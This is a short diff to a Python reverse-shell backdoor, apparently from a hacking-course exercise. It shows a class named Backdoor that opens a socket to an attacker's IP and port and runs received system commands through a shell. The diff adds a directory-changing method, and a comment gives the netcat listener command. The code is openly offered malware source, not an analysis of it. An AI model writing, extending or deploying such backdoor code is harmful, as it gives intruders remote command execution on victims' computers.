@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python3 - bytes-like object error
 
-import json, socket, subprocess
+import json, os, socket, subprocess
 
 #to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
@@ -11,6 +11,10 @@ class Backdoor:
     def __init__ (self, ip, port): #constructor method
         self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
+        
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
         
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
